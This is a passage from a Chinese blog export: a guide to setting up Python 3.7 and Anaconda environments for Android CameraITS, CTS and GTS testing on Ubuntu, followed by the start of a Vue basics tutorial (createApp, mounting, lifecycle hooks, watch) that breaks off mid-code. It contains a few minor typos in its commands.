class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">1.安装环境依赖包</span><br><span class="line">sudo apt-get install zlib1g-dev libbz2-dev libssl-dev libncurses5-dev libsqlite3-dev</span><br><span class="line">libreadline-dev tk-dev libgdbm-dev libdb-dev libpcap-dev xz-utils libexpat1-dev liblzmadev libffi-dev libc6-dev</span><br><span class="line">2.创建安装⽬录</span><br><span class="line">sudo mkdir -p /usr/local/python3.7</span><br><span class="line">3.下载python3.7 并解压下载安装包</span><br><span class="line">wget https://www.python.org/ftp/python/3.7.10/Python-3.7.10.tgz</span><br><span class="line">tar -zxvf Python-3.7.8.tgz</span><br><span class="line">4.进⼊解压的⽬录</span><br><span class="line">5.编译安装</span><br><span class="line">./configure --prefix=/usr/local/python3.7 --enable-optimizations --enable-shared</span><br><span class="line">--prefix⽤于指定安装位置</span><br><span class="line">--enable-optimizations⽤于优化配置</span><br><span class="line">编译</span><br><span class="line">make -j8</span><br><span class="line">//可直接⽤编译好的版本：python3.7.tar.gz //可直接拷⻉⾄/usr/local/python3.7 进⾏解压</span><br><span class="line">此编译必须在ubuntu下编译才可成功，windows linux⼦系统编译会报错</span><br><span class="line">为了防⽌替换掉系统默认安装版本，使⽤altinstall：</span><br><span class="line">sudo make altinstall</span><br><span class="line">6. 建⽴指向python3.7和pip3.7的软链接</span><br><span class="line">由于存在python3的软链接指向系统默认python3.10，因此建⽴python3.7指向新安装python版本</span><br><span class="line">即可</span><br><span class="line">ln -s /usr/local/python3.7/bin/python3.7 /usr/bin/python3.7</span><br><span class="line">7、如果默认改成python3.7的，不⽤python3.6,可以做如下两⾏</span><br><span class="line">ln -sf /usr/local/python3.7/bin/python3.7 /usr/bin/python3</span><br><span class="line">ln -sf /usr/local/python3.7/bin/python3.7 /usr/bin/python</span><br><span class="line">ln -sf /usr/local/python3.7/bin/pip3.7 /usr/bin/pip3</span><br><span class="line">ln -sf /usr/local/python3.7/bin/pip3.7 /usr/bin/pip</span><br><span class="line">8、查看python版本报错：</span><br><span class="line">bing_wu@bing:~/workspaces/GMS$ python3.7 -v</span><br><span class="line">python3.7: error while loading shared libraries: libpython3.7m.so.1.0: cannot open shared</span><br><span class="line">object file: No such file or directory</span><br><span class="line">bing_wu@bing:~/workspaces/GMS$ find -name libpython3.7m.so.1.0</span><br><span class="line">./Python-3.7.10/libpython3.7m.so.1.0</span><br><span class="line">bing_wu@bing:~/workspaces/GMS$ sudo cp ./Python-3.7.10/libpython3.7m.so.1.0</span><br><span class="line">/usr/lib32/</span><br><span class="line">bing_wu@bing:~/workspaces/GMS$ sudo cp ./Python-3.7.10/libpython3.7m.so.1.0 /usr/lib/</span><br><span class="line">8、使⽤pip安装依赖包报错</span><br><span class="line">subprocess.CalledProcessError: Command &#x27;(&#x27;lsb_release&#x27;, &#x27;-a&#x27;)&#x27; returned non-zero exit</span><br><span class="line">status 1.</span><br><span class="line">8.1解决⽅式：</span><br><span class="line">bing_wu@bing:~/workspaces/GMS$ sudo find /usr/ -name &#x27;lsb_release.py&#x27;</span><br><span class="line">/usr/share/pyshared/lsb_release.py</span><br><span class="line">/usr/lib/python2.7/dist-packages/lsb_release.py</span><br><span class="line">/usr/lib/python3/dist-packages/lsb_release.py</span><br><span class="line">bing_wu@bing:~/workspaces/GMS$ sudo cp /usr/share/pyshared/lsb_release.py</span><br><span class="line">/usr/local/python3.7/lib/python3.7/</span><br><span class="line">8.2 同时还需要将CommandNotFound所在的⽬录复制到上⾯相同的⽬录下⾯</span><br><span class="line">bing_wu@bing:~/workspaces/GMS$ sudo locate CommandNotFound</span><br><span class="line">/usr/lib/python3/dist-packages/CommandNotFound</span><br><span class="line">/usr/lib/python3/dist-packages/CommandNotFound/CommandNotFound.py</span><br><span class="line">/usr/lib/python3/dist-packages/CommandNotFound/__init__.py</span><br><span class="line">/usr/lib/python3/dist-packages/CommandNotFound/__pycache__</span><br><span class="line">/usr/lib/python3/dist-packages/CommandNotFound/db</span><br><span class="line">/usr/lib/python3/dist-packages/CommandNotFound/util.py</span><br><span class="line">/usr/lib/python3/distpackages/CommandNotFound/__pycache__/CommandNotFound.cpython-36.pyc</span><br><span class="line">/usr/lib/python3/dist-packages/CommandNotFound/__pycache__/__init__.cpython-36.pyc</span><br><span class="line">/usr/lib/python3/dist-packages/CommandNotFound/__pycache__/util.cpython-36.pyc</span><br><span class="line">/usr/lib/python3/dist-packages/CommandNotFound/db/__init__.py</span><br><span class="line">/usr/lib/python3/dist-packages/CommandNotFound/db/__pycache__</span><br><span class="line">/usr/lib/python3/dist-packages/CommandNotFound/db/creator.py</span><br><span class="line">/usr/lib/python3/dist-packages/CommandNotFound/db/db.py</span><br><span class="line">/usr/lib/python3/dist-packages/CommandNotFound/db/__pycache__/__init__.cpython-</span><br><span class="line">36.pyc</span><br><span class="line">/usr/lib/python3/dist-packages/CommandNotFound/db/__pycache__/creator.cpython-</span><br><span class="line">36.pyc</span><br><span class="line">/usr/lib/python3/dist-packages/CommandNotFound/db/__pycache__/db.cpython-36.pyc</span><br><span class="line">bing_wu@bing:~/workspaces/GMS$ cd /usr/local/python3.7/lib/python3.7/</span><br><span class="line">bing_wu@bing:/usr/local/python3.7/lib/python3.7$ sudo cp /usr/lib/python3/distpackages/CommandNotFound/ ./ -R</span><br><span class="line">将__pycache__⼦⽬录中的⽂件名中带有36名字的⽂件更改为37</span><br><span class="line">再次执⾏pip install 就ok</span><br><span class="line">9.1接着安装测试环境：</span><br><span class="line">9.1创建 Python 虚拟环境：</span><br><span class="line">python -m venv .</span><br><span class="line">9.2切换⾄虚拟环境中</span><br><span class="line">source bin/activate</span><br><span class="line">9.3安装 Python 插件：</span><br><span class="line">pip install opencv-python==3.4.2.17</span><br><span class="line">pip install numpy==1.19.2</span><br><span class="line">pip install matplotlib==3.3.2</span><br><span class="line">pip install scipy==1.5.2</span><br><span class="line">pip install pyserial==3.5</span><br><span class="line">pip install pillow==8.1.0</span><br><span class="line">pip install pyyaml==5.3.1</span><br><span class="line">pip install mobly</span><br><span class="line">10.切换⾄测试⼯具⽬录(CameraITS)下</span><br><span class="line">10.1修改配置⽂件-config.yml（详细如下图）</span><br><span class="line">10.2初始化环境：source build/envsetup.sh</span><br><span class="line">11.执⾏指令</span><br><span class="line">全测：python tools/run_all_test.py 或 python toos/run_all_test.py -c config.yml</span><br><span class="line">单测：python tools/run_al_test.py camera=0/1 scenes=XXX(场景) 或 python toos/run_all_test.py -c config.yml </span><br><span class="line">-c config.yml(可在 config.yml ⽂件配置 camera=XXX，scenes=XXX，的具体参数)</span><br><span class="line"></span><br><span class="line">备注</span><br><span class="line">1.Android12 CameraITS：需在建⽴独⽴的 python 虚拟空间下执⾏测试。</span><br><span class="line">2.配置⽂件（config.yml）：在设备测试 CameraITS 前，需在该配置⽂件⾥⾯，添加设备的 ID 号。</span><br><span class="line">3.升级完Python后可能导致终端⽆法打开：</span><br><span class="line">    安装某个版本的python配置之后，突然发现终端⽆法打开，具体表现为桌⾯点击⽆作⽤，ctrl+alt+T</span><br><span class="line">    也打不开，只能从选择⽂件夹，右击选择终端打开时可以。</span><br><span class="line">    1.打开vscode的终端（或pycharm终端），进⼊/usr/bin⽬录</span><br><span class="line">    2.使⽤命令ll python*查看可⽤的python链接（注意：绿⾊的字体表示有效）</span><br><span class="line">    3.使⽤命令 sudo gedit gnome-terminal，此时打开gnome-terminal⽂件</span><br><span class="line">    4.将第⼀⾏改为#!/usr/bin/python3.7（这⾥的python3.7就是上⼀步查看到可⽤的链接，需根据⾃</span><br><span class="line">    ⼰情况修改，不需要加星号）。</span><br><span class="line">    5.保存并关闭这个⽂件，然后就可以打开ubuntu⾃带的终端了</span><br></pre></td></tr></table></figure><p><img src="/upload/image-20231012111920117.png" alt="image-20231012111920117"></p><h4 id="3-2-方案二：Anaconda"><a href="#3-2-方案二：Anaconda" class="headerlink" title="3.2 方案二：Anaconda"></a>3.2 方案二：Anaconda</h4><p>首先安装anaconda，在官网可以下载Linux版本对应的安装包（该文件在 <code>安装文件/Anaconda3-2023.09-0-Linux-x86_64.sh</code>），这是一个可执行的shell脚本文件，放到Ubuntu中，采用chmod赋予可执行权限，直接执行该脚本，会进入阅读许可证，按回车到最后一行然后输入yes同意许可，后面再按回车即可默认安装。指令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd python</span><br><span class="line">sudo chmod 777 Anaconda3-2023.09-0-Linux-x86_64.sh</span><br><span class="line">./Anaconda3-2023.09-0-Linux-x86_64.sh</span><br><span class="line"># 这个时候会出现 &gt;&gt;&gt;  这是正常的 按回车就好了，后面一直按回车阅读许可，注意别按太快，后面还需要输入yes。遇到&gt;&gt;&gt;就按回车，遇到yes or no的就输入yes，这是采用默认的安装设置，安装完会在home目录下。</span><br></pre></td></tr></table></figure><p>conda安装成功后需要重新开启一个终端，此时就能在用户名前面看到一个<code>(base)</code> 了，这就是目前所在的conda环境。</p><p>先用conda创建一个python3.7.10的环境，我这里给他起名字叫 gms_3.7.10：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda create -n gms_3.7.10 python==3.7.10</span><br></pre></td></tr></table></figure><p>然后切换到该环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source activate gms_3.7.10</span><br></pre></td></tr></table></figure><p><strong>CTS Verifier 中的ITS测试所需依赖</strong></p><p>在下面这个网站可以下载各个安卓版本的CTS和CTS Verifier工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://source.android.google.cn/docs/compatibility/cts/downloads</span><br></pre></td></tr></table></figure><p>将CTS Verifier下载好，解压后，可以看到里面有一个CameraITS文件夹，到该文件夹下输入 <code>source build/envsetup.sh</code> 就能看到需要哪些依赖，这里将需要安装的依赖已列出，直接复制了执行即可。其中最后一个mobly库是Android 12 及之后版本需要使用的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pip install opencv-python==3.4.2.17 -i https://pypi.tuna.tsinghua.edu.cn/simple/ --trusted-host pypi.tuna.tsinghua.com</span><br><span class="line">pip install numpy==1.19.2 -i https://pypi.tuna.tsinghua.edu.cn/simple/ --trusted-host pypi.tuna.tsinghua.com</span><br><span class="line">pip install matplotlib==3.3.2 -i https://pypi.tuna.tsinghua.edu.cn/simple/ --trusted-host pypi.tuna.tsinghua.com</span><br><span class="line">pip install scipy==1.5.2 -i https://pypi.tuna.tsinghua.edu.cn/simple/ --trusted-host pypi.tuna.tsinghua.com</span><br><span class="line">pip install pyserial==3.5 -i https://pypi.tuna.tsinghua.edu.cn/simple/ --trusted-host pypi.tuna.tsinghua.com</span><br><span class="line">pip install pillow==8.1.0 -i https://pypi.tuna.tsinghua.edu.cn/simple/ --trusted-host pypi.tuna.tsinghua.com</span><br><span class="line">pip install pyyaml==5.3.1 -i https://pypi.tuna.tsinghua.edu.cn/simple/ --trusted-host pypi.tuna.tsinghua.com</span><br><span class="line">pip install mobly -i https://pypi.tuna.tsinghua.edu.cn/simple/ --trusted-host pypi.tuna.tsinghua.com</span><br></pre></td></tr></table></figure><p>依赖安装完成后再输入 <code>source build/envsetup.sh</code> 就不会显示任何错误，说明配置环境正常，具备测试条件。</p><h3 id="4、CTS测试所需环境"><a href="#4、CTS测试所需环境" class="headerlink" title="4、CTS测试所需环境"></a>4、CTS测试所需环境</h3><p>如果测试主机安装的是64bit的ubuntu，需要安装如下兼容库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y libc6-i386 lib32stdc++6 lib32gcc1 lib32ncurses5 lib32z1</span><br></pre></td></tr></table></figure><p>准备好上面提到的CTS和CTS Verifier工具，一共有四个工具(我这里是Android12所以是四个)，分别为：</p><ul><li>android-cts</li><li>android-cts-media-1.5</li><li>CtsMediaTestCases-1.4</li><li>android-cts-verifier</li></ul><p>其中android-cts和android-cts-verifier每个安卓版本都不一样，需要下载自己的版本（<strong>此时需要将语言切换到英文，再下载，在中文界面下载的版本是旧的，测试时会出现问题</strong>。是待测设备的版本，一般都是<strong>arm架构</strong>），而android-cts-media-1.5和CtsMediaTestCases-1.4是通用的，不过也有版本限制，具体内容见官方文档。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://source.android.com/docs/compatibility/cts/run-locally?hl=zh-cn</span><br></pre></td></tr></table></figure><p>这里提供了Android12和Android13版本的CTS工具，文件在（<code>安装文件/CTS和CTSVerifier</code>目录下）</p><p>此处还需要备注一点：在官方文档的CTS测试中，Android13是需要拷贝android-cts-media-1.5 和 CtsMediaTestCases-1.4两个文件夹中的媒体文件，但是在实际测试的时候，只需要 android-cts-media-1.5 中的媒体文件即可。</p><p>CTS在运行的时候很容易因为内存不足崩溃，所以有必要设置一下内存大小，设置方法为编辑<code>tools/cts-tradefed</code>文件。在最后一行将Java运行时虚拟机的内存大小设置为电脑的内存大小。</p><h3 id="5、GTS测试所需环境"><a href="#5、GTS测试所需环境" class="headerlink" title="5、GTS测试所需环境"></a>5、GTS测试所需环境</h3><p>需要下载 android-gts-11-R1(11-14)-10495246.zip 和 gts-verifier-10-R4-10054163.zip 两个压缩包到主机上，这两个工具并不是公开下载。 （在 安装文件&#x2F;GTS&#x2F; 目录下）</p>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue基础</title>
    <link href="/2023/11/23/Vue%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/11/23/Vue%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="API风格"><a href="#API风格" class="headerlink" title="API风格"></a>API风格</h3><p>Vue 的组件可以按两种不同的风格书写：<strong>选项式 API</strong> 和<strong>组合式 API</strong>。</p><p><strong>选项式 API</strong></p><p>使用选项式 API，我们可以用包含多个选项的对象来描述组件的逻辑，例如 <code>data</code>、<code>methods</code> 和 <code>mounted</code>。选项所定义的属性都会暴露在函数内部的 <code>this</code> 上，它会指向当前的组件实例。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  // data() 返回的属性将会成为响应式的状态</span><br><span class="line">  // 并且暴露在 `this` 上</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      count: 0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  // methods 是一些用来更改状态与触发更新的函数</span><br><span class="line">  // 它们可以在模板中作为事件处理器绑定</span><br><span class="line">  methods: &#123;</span><br><span class="line">    increment() &#123;</span><br><span class="line">      this.count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  // 生命周期钩子会在组件生命周期的各个不同阶段被调用</span><br><span class="line">  // 例如这个函数就会在组件挂载完成后被调用</span><br><span class="line">  mounted() &#123;</span><br><span class="line">    console.log(`The initial count is $&#123;this.count&#125;.`)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;button @click=&quot;increment&quot;&gt;Count is: &#123;&#123; count &#125;&#125;&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p><strong>组合式 API</strong></p><p>通过组合式 API，我们可以使用导入的 API 函数来描述组件逻辑。在单文件组件中，组合式 API 通常会与 <code>&lt;script setup&gt;</code> 搭配使用。这个 <code>setup</code> attribute 是一个标识，告诉 Vue 需要在编译时进行一些处理，让我们可以更简洁地使用组合式 API。比如，<code>&lt;script setup&gt;</code> 中的导入和顶层变量&#x2F;函数都能够在模板中直接使用。</p><p>下面是使用了组合式 API 与 <code>&lt;script setup&gt;</code> 改造后和上面的模板完全一样的组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; ref, onMounted &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">// 响应式状态</span><br><span class="line">const count = ref(0)</span><br><span class="line"></span><br><span class="line">// 用来修改状态、触发更新的函数</span><br><span class="line">function increment() &#123;</span><br><span class="line">  count.value++</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 生命周期钩子</span><br><span class="line">onMounted(() =&gt; &#123;</span><br><span class="line">  console.log(`The initial count is $&#123;count.value&#125;.`)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;button @click=&quot;increment&quot;&gt;Count is: &#123;&#123; count &#125;&#125;&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p>官方的文档是按照选项式和组合式两种不同的类型来编写的，两种的语法会有点不同，我这边文章以组合式API为主。</p><h3 id="vue应用"><a href="#vue应用" class="headerlink" title="vue应用"></a>vue应用</h3><p>每个 Vue 应用都是通过 <code>createApp</code> 函数创建一个新的 应用实例：<br>在 <code>main.js</code> 文件中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import &#123; createApp &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">const app = createApp(&#123;</span><br><span class="line">  /* 根组件选项 */</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="根组件"><a href="#根组件" class="headerlink" title="根组件"></a>根组件</h3><p>我们传入 <code>createApp</code> 的对象实际上是一个组件，每个应用都需要一个“根组件”，其他组件将作为其子组件。</p><p>如果你使用的是单文件组件，我们可以直接从另一个文件中导入根组件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import &#123; createApp &#125; from &#x27;vue&#x27;</span><br><span class="line">// 从一个单文件组件中导入根组件</span><br><span class="line">import App from &#x27;./App.vue&#x27;</span><br><span class="line"></span><br><span class="line">const app = createApp(App)</span><br></pre></td></tr></table></figure><h3 id="挂载应用"><a href="#挂载应用" class="headerlink" title="挂载应用"></a>挂载应用</h3><p>应用实例必须在调用了 <code>.mount()</code> 方法后才会渲染出来。该方法接收一个“容器”参数，可以是一个实际的 DOM 元素或是一个 CSS 选择器字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">html中：</span><br><span class="line">&lt;div id=&quot;app&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">main.js中：</span><br><span class="line">app.mount(&#x27;#app&#x27;)</span><br></pre></td></tr></table></figure><p>应用根组件的内容将会被渲染在容器元素里面。容器元素自己将不会被视为应用的一部分。</p><p><code>.mount()</code> 方法应该始终在整个应用配置和资源注册完成后被调用。同时请注意，不同于其他资源注册方法，它的返回值是根组件实例而非应用实例。</p><h3 id="DOM-中的根组件模板"><a href="#DOM-中的根组件模板" class="headerlink" title="DOM 中的根组件模板"></a>DOM 中的根组件模板</h3><p>根组件的模板通常是组件本身的一部分，但也可以直接通过在挂载容器内编写模板来单独提供：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">  &lt;button @click=&quot;count++&quot;&gt;&#123;&#123; count &#125;&#125;&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import &#123; createApp &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">const app = createApp(&#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      count: 0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.mount(&#x27;#app&#x27;)</span><br></pre></td></tr></table></figure><p>当根组件没有设置 <code>template</code> 选项时，Vue 将自动使用容器的 <code>innerHTML</code> 作为模板。</p><p>DOM 内模板通常用于<a href="https://cn.vuejs.org/guide/quick-start.html#using-vue-from-cdn">无构建步骤</a>的 Vue 应用程序。它们也可以与服务器端框架一起使用，其中根模板可能是由服务器动态生成的。</p><h3 id="应用配置"><a href="#应用配置" class="headerlink" title="应用配置"></a>应用配置</h3><p>应用实例会暴露一个 <code>.config</code> 对象允许我们配置一些应用级的选项，例如定义一个应用级的错误处理器，用来捕获所有子组件上的错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.config.errorHandler = (err) =&gt; &#123;</span><br><span class="line">  /* 处理错误 */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应用实例还提供了一些方法来注册应用范围内可用的资源，例如注册一个组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.component(&#x27;TodoDeleteButton&#x27;, TodoDeleteButton)</span><br></pre></td></tr></table></figure><p>这使得 <code>TodoDeleteButton</code> 在应用的任何地方都是可用的。我们会在指南的后续章节中讨论关于组件和其他资源的注册。你也可以在 <a href="https://cn.vuejs.org/api/application.html">API 参考</a>中浏览应用实例 API 的完整列表。</p><p>确保在挂载应用实例之前完成所有应用配置！</p><h3 id="多应用实例"><a href="#多应用实例" class="headerlink" title="多应用实例"></a>多应用实例</h3><p>应用实例并不只限于一个。<code>createApp</code> API 允许你在同一个页面中创建多个共存的 Vue 应用，而且每个应用都拥有自己的用于配置和全局资源的作用域。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const app1 = createApp(&#123;</span><br><span class="line">  /* ... */</span><br><span class="line">&#125;)</span><br><span class="line">app1.mount(&#x27;#container-1&#x27;)</span><br><span class="line"></span><br><span class="line">const app2 = createApp(&#123;</span><br><span class="line">  /* ... */</span><br><span class="line">&#125;)</span><br><span class="line">app2.mount(&#x27;#container-2&#x27;)</span><br></pre></td></tr></table></figure><p>如果你正在使用 Vue 来增强服务端渲染 HTML，并且只想要 Vue 去控制一个大型页面中特殊的一小部分，应避免将一个单独的 Vue 应用实例挂载到整个页面上，而是应该创建多个小的应用实例，将它们分别挂载到所需的元素上去。</p><h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><p>每个 Vue 组件实例在创建时都需要经历一系列的初始化步骤，比如设置好数据侦听，编译模板，挂载实例到 DOM，以及在数据改变时更新 DOM。在此过程中，它也会运行被称为生命周期钩子的函数，让开发者有机会在特定阶段运行自己的代码。</p><p><strong>注册周期钩子</strong></p><p>举例来说，<code>onMounted</code> 钩子可以用来在组件完成初始渲染并创建 DOM 节点后运行代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; onMounted &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">onMounted(() =&gt; &#123;</span><br><span class="line">  console.log(`the component is now mounted.`)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>还有其他一些钩子，会在实例生命周期的不同阶段被调用，最常用的是 <a href="https://cn.vuejs.org/api/composition-api-lifecycle.html#onmounted"><code>onMounted</code></a>、<a href="https://cn.vuejs.org/api/composition-api-lifecycle.html#onupdated"><code>onUpdated</code></a> 和 <a href="https://cn.vuejs.org/api/composition-api-lifecycle.html#onunmounted"><code>onUnmounted</code></a>。所有生命周期钩子的完整参考及其用法请参考 <a href="https://cn.vuejs.org/api/composition-api-lifecycle.html">API 索引</a>。</p><h3 id="侦听器"><a href="#侦听器" class="headerlink" title="侦听器"></a>侦听器</h3><p>在有些情况下，我们需要在状态变化时执行一些“副作用”：例如更改 DOM，或是根据异步操作的结果去修改另一处的状态。</p><p>在组合式 API 中，我们可以使用 <a href="https://cn.vuejs.org/api/reactivity-core.html#watch"><code>watch</code> 函数</a>在每次响应式状态发生变化时触发回调函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; ref, watch &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">const question = ref(&#x27;&#x27;)</span><br><span class="line">const answer = ref(&#x27;Questions usually contain a question mark. ;-)&#x27;)</span><br><span class="line"></span><br><span class="line">// 可以直接侦听一个 ref</span><br><span class="line">watch(question, async (newQuestion, oldQuestion) =&gt; &#123;</span><br><span 